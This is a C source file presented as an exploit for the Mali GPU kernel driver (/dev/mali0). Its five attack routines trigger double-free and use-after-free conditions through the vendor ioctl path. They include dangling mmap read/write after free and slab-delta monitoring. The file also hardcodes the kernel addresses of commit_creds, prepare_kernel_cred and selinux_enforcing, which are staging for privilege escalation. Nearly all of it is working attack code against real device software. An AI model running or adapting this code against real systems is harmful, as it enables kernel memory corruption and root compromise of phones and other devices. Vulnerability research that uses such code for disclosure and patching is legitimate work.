/*
 * mali_exploit6.c — Mali vendor dispatch double-free & UAF exploit
 *
 * KEY FINDING: Vendor MEM_FREE (func=516, magic 0x80) successfully frees
 * Mali GPU regions. This enables:
 *
 * Attack 1: Double-free (ALLOC → std FREE → vendor FREE same gpu_va)
 *   If vendor free doesn't check already-freed state → slab corruption
 *
 * Attack 2: mmap UAF (ALLOC → mmap → vendor FREE → access via mapping)
 *   If mmap pages aren't unmapped → dangling CPU mapping to freed pages
 *
 * Attack 3: Vendor-only double free (ALLOC → vendor FREE → vendor FREE)
 *   Pure vendor path double-free
 *
 * Attack 4: Cross-reference UAF (ALLOC → vendor FREE → ALLOC new → old ref)
 *   If vendor free doesn't invalidate all references
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0
#define SELINUX_ENFORCING   0xc0b7ad54

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int read_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, name)) {
            int active;
            if (sscanf(line, "%*s %d", &active) == 1) {
                fclose(f); return active;
            }
        }
    }
    fclose(f);
    return -1;
}

/* Mali memory operations */
static int mali_alloc(int fd, uint32_t pages, uint64_t *out_gpu_va) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8)  = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint64_t*)(buf + 32) = 0xF;

    if (ioctl(fd, make_cmd_std(56), buf) < 0) return -1;
    if (((struct uk_header*)buf)->id != 0) return -1;
    *out_gpu_va = *(uint64_t*)(buf + 40);
    return 0;
}

static int mali_free_std(int fd, uint64_t gpu_va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = gpu_va;
    ioctl(fd, make_cmd_std(16), buf);
    return ((struct uk_header*)buf)->id;
}

static int mali_free_vendor(int fd, uint64_t gpu_va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = gpu_va;
    ioctl(fd, make_cmd_vendor(16), buf);
    return ((struct uk_header*)buf)->id;
}

/* ============================================================= */
/* ATTACK 1: ALLOC → std FREE → vendor FREE (double-free)        */
/* ============================================================= */
static void attack1_double_free(int mali_fd) {
    fprintf(stderr, "\n=== ATTACK 1: Standard free + vendor free ===\n");

    uint64_t gpu_va;
    if (mali_alloc(mali_fd, 1, &gpu_va) < 0) {
        fprintf(stderr, "  ALLOC failed\n");
        return;
    }
    fprintf(stderr, "  Allocated gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    int k256_before = read_slab("kmalloc-256");

    int r1 = mali_free_std(mali_fd, gpu_va);
    fprintf(stderr, "  Standard FREE: result=%d\n", r1);

    int k256_after1 = read_slab("kmalloc-256");
    fprintf(stderr, "  k256 delta after std free: %+d\n", k256_after1 - k256_before);

    int r2 = mali_free_vendor(mali_fd, gpu_va);
    fprintf(stderr, "  Vendor FREE (same gpu_va): result=%d\n", r2);

    int k256_after2 = read_slab("kmalloc-256");
    fprintf(stderr, "  k256 delta after vendor free: %+d\n", k256_after2 - k256_after1);

    if (r2 == 0) {
        fprintf(stderr, "  *** DOUBLE FREE SUCCEEDED! ***\n");
    } else {
        fprintf(stderr, "  Vendor free rejected (result=%d) — not a double free\n", r2);
    }
}

/* ============================================================= */
/* ATTACK 2: ALLOC → vendor FREE → vendor FREE (pure double)     */
/* ============================================================= */
static void attack2_vendor_double_free(int mali_fd) {
    fprintf(stderr, "\n=== ATTACK 2: Vendor free × 2 ===\n");

    uint64_t gpu_va;
    if (mali_alloc(mali_fd, 1, &gpu_va) < 0) {
        fprintf(stderr, "  ALLOC failed\n");
        return;
    }
    fprintf(stderr, "  Allocated gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    int k256_before = read_slab("kmalloc-256");

    int r1 = mali_free_vendor(mali_fd, gpu_va);
    fprintf(stderr, "  First vendor FREE: result=%d\n", r1);

    int k256_after1 = read_slab("kmalloc-256");
    fprintf(stderr, "  k256 delta: %+d\n", k256_after1 - k256_before);

    int r2 = mali_free_vendor(mali_fd, gpu_va);
    fprintf(stderr, "  Second vendor FREE: result=%d\n", r2);

    int k256_after2 = read_slab("kmalloc-256");
    fprintf(stderr, "  k256 delta: %+d\n", k256_after2 - k256_after1);

    if (r2 == 0) {
        fprintf(stderr, "  *** VENDOR DOUBLE FREE SUCCEEDED! ***\n");
    } else {
        fprintf(stderr, "  Second vendor free rejected — no double free\n");
    }
}

/* ============================================================= */
/* ATTACK 3: mmap + vendor FREE (dangling mapping UAF)           */
/* ============================================================= */
static void attack3_mmap_uaf(int mali_fd) {
    fprintf(stderr, "\n=== ATTACK 3: mmap + vendor free UAF ===\n");

    uint64_t gpu_va;
    if (mali_alloc(mali_fd, 1, &gpu_va) < 0) {
        fprintf(stderr, "  ALLOC failed\n");
        return;
    }
    fprintf(stderr, "  Allocated gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    /* mmap the GPU region to get CPU access */
    /* Mali mmap uses the gpu_va as page offset: pgoff = gpu_va >> PAGE_SHIFT */
    uint32_t pgoff = (uint32_t)(gpu_va >> 12);
    void *mapped = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                        mali_fd, (off_t)pgoff * 4096);
    if (mapped == MAP_FAILED) {
        fprintf(stderr, "  mmap failed: %s (errno=%d)\n", strerror(errno), errno);

        /* Try alternative: mmap with the raw gpu_va as offset */
        mapped = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                      mali_fd, (off_t)(gpu_va & 0xFFFFFFFF));
        if (mapped == MAP_FAILED) {
            fprintf(stderr, "  alt mmap also failed: %s\n", strerror(errno));
            /* Try yet another approach: mmap with offset 0 */
            mapped = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                          mali_fd, 0);
            if (mapped == MAP_FAILED) {
                fprintf(stderr, "  zero-offset mmap failed too: %s\n", strerror(errno));
                mali_free_std(mali_fd, gpu_va);
                return;
            }
        }
    }
    fprintf(stderr, "  mmap'd at %p\n", mapped);

    /* Write pattern to the mapped memory */
    volatile uint32_t *p = (volatile uint32_t *)mapped;
    p[0] = 0xDEADBEEF;
    p[1] = 0xCAFEBABE;
    fprintf(stderr, "  Wrote: [0]=0x%08x [1]=0x%08x\n", p[0], p[1]);

    /* Free via vendor dispatch */
    int r = mali_free_vendor(mali_fd, gpu_va);
    fprintf(stderr, "  Vendor FREE: result=%d\n", r);

    /* Try to read from the mapping — if pages are still mapped, this works */
    fprintf(stderr, "  After free: [0]=0x%08x [1]=0x%08x\n", p[0], p[1]);
    if (p[0] == 0xDEADBEEF) {
        fprintf(stderr, "  *** DANGLING MAPPING — DATA STILL ACCESSIBLE! ***\n");

        /* Try writing too */
        p[2] = 0x41414141;
        fprintf(stderr, "  Write after free: [2]=0x%08x\n", p[2]);
        if (p[2] == 0x41414141) {
            fprintf(stderr, "  *** FULL READ/WRITE UAF ON PHYSICAL PAGES! ***\n");
        }
    } else if (p[0] == 0) {
        fprintf(stderr, "  Pages zeroed (reclaimed by kernel)\n");
    } else {
        fprintf(stderr, "  Pages contain different data (reallocated!)\n");
    }

    munmap(mapped, 4096);
}

/* ============================================================= */
/* ATTACK 4: Vendor flags_change on freed region                  */
/* ============================================================= */
static void attack4_flags_change(int mali_fd) {
    fprintf(stderr, "\n=== ATTACK 4: Vendor flags_change after free ===\n");

    uint64_t gpu_va;
    if (mali_alloc(mali_fd, 1, &gpu_va) < 0) {
        fprintf(stderr, "  ALLOC failed\n");
        return;
    }
    fprintf(stderr, "  Allocated gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    /* Free via standard */
    mali_free_std(mali_fd, gpu_va);
    fprintf(stderr, "  Standard FREE: done\n");

    /* Try flags_change via vendor on freed region */
    /* func=517: MEM_FLAGS_CHANGE
     * struct: uk_header(8) + gpu_va(8) + flags(8) = 24 bytes */
    uint8_t buf[24];
    memset(buf, 0, 24);
    ((struct uk_header*)buf)->id = 517;
    *(uint64_t*)(buf + 8) = gpu_va;
    *(uint64_t*)(buf + 16) = 0xF;  /* all protections */

    int r = ioctl(mali_fd, make_cmd_vendor(24), buf);
    uint32_t result = ((struct uk_header*)buf)->id;
    fprintf(stderr, "  Vendor FLAGS_CHANGE: ioctl=%d result=%u\n", r, result);

    /* Also try vendor MEM_QUERY on freed region */
    /* func=515: MEM_QUERY
     * struct: uk_header(8) + gpu_addr(8) + query(8) + value(8) = 32 */
    memset(buf, 0, 24);
    ((struct uk_header*)buf)->id = 515;
    *(uint64_t*)(buf + 8) = gpu_va;

    r = ioctl(mali_fd, make_cmd_vendor(24), buf);
    result = ((struct uk_header*)buf)->id;
    fprintf(stderr, "  Vendor MEM_QUERY: ioctl=%d result=%u\n", r, result);
}

/* ============================================================= */
/* ATTACK 5: Multiple alloc → vendor free all → slab confusion   */
/* ============================================================= */
static void attack5_multi_alloc_free(int mali_fd) {
    fprintf(stderr, "\n=== ATTACK 5: Multiple alloc + mass vendor free ===\n");

    #define N_REGIONS 20
    uint64_t gpu_vas[N_REGIONS];
    int alloc_count = 0;

    /* Allocate many regions */
    for (int i = 0; i < N_REGIONS; i++) {
        if (mali_alloc(mali_fd, 1, &gpu_vas[i]) == 0) {
            alloc_count++;
        }
    }
    fprintf(stderr, "  Allocated %d regions\n", alloc_count);

    int k256_before = read_slab("kmalloc-256");
    int k128_before = read_slab("kmalloc-128");
    int k64_before = read_slab("kmalloc-64");

    /* Free odd-numbered regions via standard */
    for (int i = 1; i < alloc_count; i += 2) {
        mali_free_std(mali_fd, gpu_vas[i]);
    }
    fprintf(stderr, "  Freed odd regions via standard\n");

    /* Now try to free those SAME regions again via vendor */
    int double_free_count = 0;
    for (int i = 1; i < alloc_count; i += 2) {
        int r = mali_free_vendor(mali_fd, gpu_vas[i]);
        if (r == 0) double_free_count++;
    }
    fprintf(stderr, "  Vendor free of already-freed: %d/%d succeeded\n",
            double_free_count, (alloc_count+1)/2);

    /* Also free even-numbered via vendor (these are still live) */
    for (int i = 0; i < alloc_count; i += 2) {
        mali_free_vendor(mali_fd, gpu_vas[i]);
    }

    int k256_after = read_slab("kmalloc-256");
    int k128_after = read_slab("kmalloc-128");
    int k64_after = read_slab("kmalloc-64");

    fprintf(stderr, "  Slab delta: k256=%+d k128=%+d k64=%+d\n",
            k256_after - k256_before, k128_after - k128_before,
            k64_after - k64_before);

    if (double_free_count > 0) {
        fprintf(stderr, "  *** %d DOUBLE FREES SUCCEEDED! ***\n", double_free_count);
    }
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Double-Free & UAF Exploit ===\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) {
        fprintf(stderr, "Cannot open Mali!\n");
        return 1;
    }

    if (test == 0 || test == 1) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); attack1_double_free(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  ATTACK 1 signal %d%s\n", WTERMSIG(status),
                    WTERMSIG(status)==14?" (timeout)":"");
    }

    if (test == 0 || test == 2) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); attack2_vendor_double_free(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  ATTACK 2 signal %d%s\n", WTERMSIG(status),
                    WTERMSIG(status)==14?" (timeout)":"");
    }

    if (test == 0 || test == 3) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); attack3_mmap_uaf(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  ATTACK 3 signal %d%s\n", WTERMSIG(status),
                    WTERMSIG(status)==14?" (timeout)":"");
    }

    if (test == 0 || test == 4) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); attack4_flags_change(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  ATTACK 4 signal %d%s\n", WTERMSIG(status),
                    WTERMSIG(status)==14?" (timeout)":"");
    }

    if (test == 0 || test == 5) {
        pid_t pid = fork();
        if (pid == 0) { alarm(10); attack5_multi_alloc_free(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  ATTACK 5 signal %d%s\n", WTERMSIG(status),
                    WTERMSIG(status)==14?" (timeout)":"");
    }

    close(mali_fd);
    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
